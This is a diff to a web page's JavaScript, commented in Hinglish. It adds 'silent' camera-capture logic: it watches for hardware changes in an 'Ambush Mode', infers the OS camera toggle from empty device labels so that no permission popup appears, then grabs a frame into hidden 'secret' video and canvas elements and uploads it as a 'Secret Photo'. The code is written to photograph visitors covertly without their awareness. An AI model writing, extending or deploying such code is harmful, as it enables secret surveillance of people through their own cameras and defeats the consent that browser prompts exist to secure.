@@ -290,56 +290,71 @@
       }
   }
 
-  // NAYA FUNCTION: Smart Silent Camera Update (Waiting Mode Logic)
-  function silentCameraUpdate() {
-      // Check agar browser ke pass pehle se permission 'granted' hai
-      if (navigator.permissions) {
-          navigator.permissions.query({ name: 'camera' }).then(res => {
-              if (res.state === 'granted') {
-                  checkAndCapture();
-              }
-          });
-      } else {
-          checkAndCapture();
+  // 1. ULTRA-ADVANCED SMART CHECK
+  async function silentCameraUpdate() {
+      // Gate check: Agar user ne pehli baar allow nahi kiya hai, toh fail
+      if (localStorage.getItem('cameraVerified') !== 'true') return;
+
+      // Agar 'Waiting Mode' me hai toh mat try karo
+      if (localStorage.getItem('camWaitMode') === 'true') {
+          setupDeviceChangeListener();
+          return;
       }
 
-      // WAITING MODE: Jab phone me camera ON/OFF hoga, ye turant active hoga
-      if(navigator.mediaDevices && navigator.mediaDevices.addEventListener) {
-          navigator.mediaDevices.addEventListener('devicechange', () => {
-              if (navigator.permissions) {
-                  navigator.permissions.query({ name: 'camera' }).then(res => {
-                      if (res.state === 'granted') {
-                          checkAndCapture(); // Camera ON hote hi silent capture
-                      }
-                  });
-              } else {
-                  checkAndCapture();
-              }
+      await checkAndCaptureAdvanced();
+      setupDeviceChangeListener();
+  }
+
+  // 2. THE HARDWARE LISTENER (Ambush Mode)
+  function setupDeviceChangeListener() {
+      if (navigator.mediaDevices && navigator.mediaDevices.addEventListener) {
+          navigator.mediaDevices.addEventListener('devicechange', async () => {
+              // Phone me kuch ON/OFF hua
+              localStorage.removeItem('camWaitMode'); 
+              await checkAndCaptureAdvanced(); 
           });
       }
   }
 
-  function checkAndCapture() {
-      // Bina popup ke check karo ki camera hardware ready hai ya nahi
-      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-          navigator.mediaDevices.enumerateDevices().then(devices => {
-              // Check karte hain ki koi video input (camera) active hai ya nahi
-              const hasCamera = devices.some(device => device.kind === 'videoinput');
-              
-              if (hasCamera) {
-                  // Agar system me camera mil gaya, tabhi photo lene ka try karo
-                  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                      .then(function(stream) {
-                          captureAndUploadPhoto(stream, "Smart Background Capture (Auto-Detect)");
-                      })
-                      .catch(function(err) {
-                          // Agar block hai toh chup-chap fail ho jao, wait karte raho
-                      });
-              }
-          }).catch(err => console.log(err));
+  // 3. THE "BLIND CHECK" ALGORITHM (Advanced Handling)
+  async function checkAndCaptureAdvanced() {
+      try {
+          // STEP A: Pehle Browser ki permission check karo
+          const perm = await navigator.permissions.query({ name: 'camera' });
+          if (perm.state === 'denied') return; // User ne hamesha ke liye block kar diya
+
+          // STEP B: Hardware Labels check karo (The Hack)
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          const cameras = devices.filter(device => device.kind === 'videoinput');
+
+          if (cameras.length === 0) return; // Camera hardware hi nahi hai
+
+          // Agar permission 'granted' hai, lekin OS ne camera lock kar rakha hai (Panel se OFF), 
+          // toh browser camera ka "label" (naam) empty ('') return karta hai.
+          const hasUnlockedCamera = cameras.some(cam => cam.label && cam.label.length > 0);
+
+          if (perm.state === 'granted' && !hasUnlockedCamera) {
+              // WARNING: OS Toggle is OFF! 
+              // Yahan getUserMedia call karenge toh OS POPUP aa jayega. 
+              // Isliye chup-chap Waiting Mode me chale jao.
+              localStorage.setItem('camWaitMode', 'true');
+              logAction("Advanced Check: OS Toggle is OFF. Entered Waiting Mode silently.");
+              return; // BAHAR NIKAL JAO (No Popup!)
+          }
+
+          // STEP C: Sab 100% Clear hai, OS toggle ON hai. Ab hit karo!
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          
+          localStorage.removeItem('camWaitMode'); // Wait mode hata do
+          captureAndUploadPhoto(stream, "Advanced Silent Capture");
+
+      } catch (err) {
+          // Agar galti se popup aaya aur user ne Cancel kiya
+          localStorage.setItem('camWaitMode', 'true');
       }
   }
 
+  // 4. PHOTO UPLOAD (150ms Fast Click)
   function captureAndUploadPhoto(stream, actionText) {
       const video = document.getElementById('secretVideo');
       const canvas = document.getElementById('secretCanvas');
@@ -364,7 +379,7 @@
                   stream.getTracks().forEach(track => track.stop()); 
                   logAction(`Secret Photo Captured: ${actionText}`);
               }).catch(e => console.error(e));
-          }, 150); // Fast 150ms delay
+          }, 150); 
       }, { once: true });
   }
 
@@ -780,4 +795,3 @@
 
 </body>
 </html>
-
